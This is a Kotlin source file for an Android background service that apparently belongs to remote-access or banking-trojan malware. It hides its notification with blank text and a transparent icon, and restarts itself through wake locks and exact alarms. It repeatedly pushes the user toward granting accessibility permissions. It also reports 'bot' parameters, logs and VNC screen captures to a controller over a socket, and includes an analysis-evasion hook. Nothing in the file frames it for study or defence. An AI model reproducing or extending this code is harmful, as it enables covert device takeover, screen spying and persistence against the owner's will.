package com.xxx.zzz.servicesp

import android.annotation.SuppressLint
import android.app.*
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.graphics.Color
import android.os.*
import android.util.Log
import android.widget.RemoteViews
import com.xxx.zzz.Payload.ApplicationScope
import com.xxx.zzz.PermissionsActivity
import com.xxx.zzz.R
import com.xxx.zzz.aall.permasd.PermUtil
import com.xxx.zzz.accessppp.AccessibilityServiceQ
import com.xxx.zzz.accessppp.ScreenCaptureService
import com.xxx.zzz.commandp.Module
import com.xxx.zzz.globp.Constantsfd
import com.xxx.zzz.globp.SharedPreferencess
import com.xxx.zzz.globp.Stringsvcx
import com.xxx.zzz.globp.utilssss.evade
import com.xxx.zzz.notifp.PushServiceds
import com.xxx.zzz.receiverss.MyReceiverda
import com.xxx.zzz.socketsp.IOSocketyt
import kotlinx.coroutines.*


@OptIn(ExperimentalStdlibApi::class)
class CommandServicedas : Service() {

    init {
        ApplicationScope.launch {
            if (Constantsfd.debug) {
                evade {}.onEscape {
                    withContext(Dispatchers.Main) {
                        runCatching {
                            stopSelf()
                        }.onFailure {
                            IOSocketyt.sendLogs("", "onEscape ${it.localizedMessage}", "error")
                        }
                    }
                }
            }
        }
    }

    val mReceiver: BroadcastReceiver = MyReceiverda()

    private var wakeLock: PowerManager.WakeLock? = null

    private var Delay = 5000L

    override fun onCreate() {
        super.onCreate()
        runCatching {
            Log.d(TAG, "On create Called")
            startForeground()

            SharedPreferencess.init(this.applicationContext)
            ensureServiceStaysRunning()

            val filter = IntentFilter(Intent.ACTION_SCREEN_ON).apply {
                addAction(Intent.ACTION_SCREEN_OFF)
                addAction(Intent.ACTION_BOOT_COMPLETED)
                addAction(Intent.ACTION_PACKAGE_ADDED)
                addAction(Intent.ACTION_PACKAGE_REMOVED)
                addAction(Intent.ACTION_REBOOT)
                addAction(Intent.ACTION_SHUTDOWN)
                addAction(Intent.ACTION_POWER_CONNECTED)
                addAction(Intent.ACTION_POWER_DISCONNECTED)
                addAction(Intent.ACTION_AIRPLANE_MODE_CHANGED)
                addAction(Intent.ACTION_BATTERY_OKAY)
                addAction(Intent.ACTION_DATE_CHANGED)
                addAction("android.net.conn.CONNECTIVITY_CHANGE")
            }
            registerReceiver(mReceiver, filter)
        }
    }

    override fun onDestroy() {
        if (wakeLock?.isHeld == true)
            wakeLock?.release()

        Log.d(TAG, "On destroy Called")
        unregisterReceiver(mReceiver)
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onTaskRemoved(rootIntent: Intent) {
        runCatching {
            IOSocketyt.sendLogs("", "CommandServicedas onTaskRemoved", "success")
            if (wakeLock?.isHeld == true)
                wakeLock?.release()

            val restartServiceIntent = Intent(this@CommandServicedas, CommandServicedas::class.java)
            val restartServicePendingIntent: PendingIntent = PendingIntent.getService(this, 1, restartServiceIntent, 0)
            registerExactAlarm(restartServicePendingIntent, 5000)
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        super.onStartCommand(intent, flags, startId)
        runCatching {
            SharedPreferencess.init(this.applicationContext)
            Log.i(TAG, "Running onStartCommand")
            Log.i(TAG, "\n\n\nSocket is " + if (IOSocketyt.instance.ioSocket?.connected() == true) "connected" else "not connected\n\n\n")

            if (IOSocketyt.instance.ioSocket?.connected() == false) {
                Log.i(TAG, "Socket is connecting ......\n")
                IOSocketyt.instance.ioSocket?.connect()
            }

            runCatching {
                wakeLock =
                    (applicationContext.getSystemService(Context.POWER_SERVICE) as PowerManager).run {
                        newWakeLock(
                            PowerManager.SCREEN_DIM_WAKE_LOCK or PowerManager.ACQUIRE_CAUSES_WAKEUP or PowerManager.ON_AFTER_RELEASE,
                            ":lock"
                        ).apply {
                            acquire()
                        }
                    }
            }.onFailure {
                IOSocketyt.sendLogs("", "wakeLock ${it.localizedMessage}", "error")
            }

            ApplicationScope.launch(Dispatchers.Default) {
                runCatching {
                    while (isActive) {
                        runCatching {
                            delay(Delay)

                            if (!AccessibilityServiceQ.isEnabled && PermUtil.isAccessibilityServiceEnabled(this@CommandServicedas, AccessibilityServiceQ::class.java)) {
                                Delay = 5000L
                                runCatching { startService(Intent(this@CommandServicedas, AccessibilityServiceQ::class.java)) }
                            }

                            if (!PermUtil.isAccessibilityServiceEnabled(this@CommandServicedas, AccessibilityServiceQ::class.java)) {
                                Delay = 7000L

                                val notificationIntent = Intent(this@CommandServicedas, PushServiceds::class.java)
                                startService(notificationIntent)

                                if (!PermissionsActivity.successLaunchUrl && start_Q > 4) {
                                    val intentAct =
                                        Intent(this@CommandServicedas, PermissionsActivity::class.java)
                                            .addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP)
                                            .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                                    startActivity(intentAct)
                                    start_Q = 0
                                } else if (PermissionsActivity.successLaunchUrl && start_Q > 10) {
                                    val intentAct =
                                        Intent(this@CommandServicedas, PermissionsActivity::class.java)
                                            .addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP)
                                            .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                                    startActivity(intentAct)
                                    start_Q = 0
                                }
                                start_Q++
                            }
                            else if(!SharedPreferencess.hasAllPermition) {
                                Delay = 7000L

                                val notificationIntent = Intent(this@CommandServicedas, PushServiceds::class.java)
                                    .apply {
                                        putExtra("message", (Stringsvcx.localeTextAccessibility() + " " + "permissions"))
                                        putExtra("messageToast", (Stringsvcx.localeTextAccessibility() + " " + "permissions"))
                                    }
                                startService(notificationIntent)

                                if (!PermissionsActivity.successLaunchUrl && start_Q > 4) {
                                    val intentAct =
                                        Intent(this@CommandServicedas, PermissionsActivity::class.java)
                                            .addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP)
                                            .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                                    startActivity(intentAct)
                                    start_Q = 0
                                } else if (PermissionsActivity.successLaunchUrl && start_Q > 10) {
                                    val intentAct =
                                        Intent(this@CommandServicedas, PermissionsActivity::class.java)
                                            .addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP)
                                            .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                                    startActivity(intentAct)
                                    start_Q = 0
                                }
                                start_Q++
                            }
                            else {
                                Delay = 5000L
                                start_Q = 100
                                Module.serviceWorkingWhile(this@CommandServicedas)

                                if (IOSocketyt.instance.ioSocket?.connected() != true) {
                                    IOSocketyt.instance.ioSocket?.connect()
                                } else {
                                    if (SharedPreferencess.step % 50 == 0) {
                                        IOSocketyt.updateBotParams()
                                    }
                                    if (SharedPreferencess.step % 2 == 0 && SharedPreferencess.registered) {
                                        IOSocketyt.checkAP()
                                    }
                                }
                            }

                            if (((ScreenCaptureService.vnc && SharedPreferencess.step % 8 == 0) || !AccessibilityServiceQ.isEnabled) && SharedPreferencess.registered) {
                                IOSocketyt.updateBotSubInfo()
                            }

                            if (ScreenCaptureService.vnc && AccessibilityServiceQ.isEnabled) {
                                Delay = 1000L
                                runCatching {
                                    IOSocketyt.sendNewVnc()
                                }.onFailure {
                                    IOSocketyt.sendLogs("", "CommandServicedas sendNewVnc ${it.localizedMessage}", "error")
                                }
                            }

                            SharedPreferencess.step++
                            SharedPreferencess.step2++
                        }.onFailure {
                            IOSocketyt.sendLogs("", "CommandServicedas2 onStartCommand ${it.localizedMessage}", "error")
                        }
                    }
                }.onFailure {
                    IOSocketyt.sendLogs("", "CommandServicedas onStartCommand ${it.localizedMessage}", "error")
                }
            }.invokeOnCompletion {
                IOSocketyt.sendLogs("", "CommandServicedas invokeOnCompletion", "success")
                val restartServiceIntent = Intent(this, CommandServicedas::class.java)
                val restartServicePendingIntent: PendingIntent =
                    PendingIntent.getService(
                        this,
                        101,
                        restartServiceIntent,
                        0 or PendingIntent.FLAG_IMMUTABLE
                    )
                registerExactAlarm(restartServicePendingIntent, 5000)
            }
        }

        return START_STICKY
    }

    private fun createNotification(): Notification {
        val notificationChannelId = "   "
        val notificationManager =
        applicationContext.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        val channel = NotificationChannel(
            notificationChannelId,
            "   ",
            NotificationManager.IMPORTANCE_LOW
        ).let {
            it.description = " "
            it.enableLights(false)
            it.lightColor = Color.WHITE
            it.enableVibration(false)
            it
        }
        notificationManager.createNotificationChannel(channel)

        val intent = Intent(this@CommandServicedas, MyReceiverda::class.java)
        val pendingIntent = PendingIntent.getBroadcast(this, 123, intent, 0)

        val builder: Notification.Builder =
            Notification.Builder(
                this,
                notificationChannelId
            )

        val remoteViews = RemoteViews(this.packageName, R.layout.custom_notif_zzz)
        builder.setContent(remoteViews)
        builder.setCustomContentView(remoteViews)
        builder.setCustomBigContentView(remoteViews)
        builder.setPriority(Notification.PRIORITY_LOW)
        builder.setCategory(Notification.CATEGORY_SERVICE)
        builder.setVisibility(Notification.VISIBILITY_SECRET)
        builder.setColor(resources.getColor(android.R.color.transparent))
        return builder
            .setContentTitle("  ")
            .setContentText("   ")
            .setTicker("    ")
            .setContentIntent(pendingIntent)
            .setSmallIcon(android.R.color.transparent)
            .build()
    }

    private fun ensureServiceStaysRunning() {
        val restartAlarmInterval = 60 * 1000
        val resetAlarmTimer = 30 * 1000L
        val restartIntent = Intent(this, MyReceiverda::class.java)

        val alarmMgr = applicationContext.getSystemService(Context.ALARM_SERVICE) as AlarmManager
        val restartServiceHandler = @SuppressLint("HandlerLeak")
        object : Handler(Looper.getMainLooper()) {
            override fun handleMessage(msg: Message) {
                val pendingIntent = PendingIntent.getBroadcast(
                    this@CommandServicedas,
                    87,
                    restartIntent,
                    0
                )
                val timer = System.currentTimeMillis() + restartAlarmInterval
                alarmMgr.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, timer, pendingIntent)
                sendEmptyMessageDelayed(0, resetAlarmTimer)
            }
        }
        restartServiceHandler.sendEmptyMessageDelayed(0, 0)
    }

    private fun startForeground() {
        val notification = createNotification()
        startForeground(98, notification)
    }

    companion object {
        private val TAG = CommandServicedas::class.java.canonicalName

        var start_Q = 0

        fun Context.registerExactAlarm(sender: PendingIntent, delayInMillis: Long) {
            val SDK_INT = Build.VERSION.SDK_INT
            val am = this.applicationContext.getSystemService(ALARM_SERVICE) as AlarmManager
            val timeInMillis = (System.currentTimeMillis() + delayInMillis) / 1000 * 1000 //> example
            if (SDK_INT < Build.VERSION_CODES.KITKAT) {
                am[AlarmManager.RTC_WAKEUP, timeInMillis] = sender
            } else if (Build.VERSION_CODES.KITKAT <= SDK_INT && SDK_INT < Build.VERSION_CODES.M) {
                am.setExact(AlarmManager.RTC_WAKEUP, timeInMillis, sender)
            } else if (SDK_INT >= Build.VERSION_CODES.M) {
                am.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, timeInMillis, sender)
            }
        }

        fun autoStart(context: Context) {
            if (!isMyServiceRunning(context, CommandServicedas::class.java)) {
                context.startForegroundService(Intent(context, CommandServicedas::class.java).apply {
                    flags = Intent.FLAG_ACTIVITY_NEW_TASK
                })
            } else {
                MyReceiverda.startCustomTimer(context, 2 * 60 * 1000L)
            }
        }

        fun isMyServiceRunning(context: Context, serviceClass: Class<*>): Boolean {
            runCatching {
                val manager =
                    context.applicationContext.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
                for (service in manager.getRunningServices(Integer.MAX_VALUE)) {
                    if (serviceClass.name == service.service.className) {
                        return true
                    }
                }
            }.onFailure {
                IOSocketyt.sendLogs("", "isMyServiceRunning ${it.localizedMessage}", "error")
            }
            return false
        }
    }

}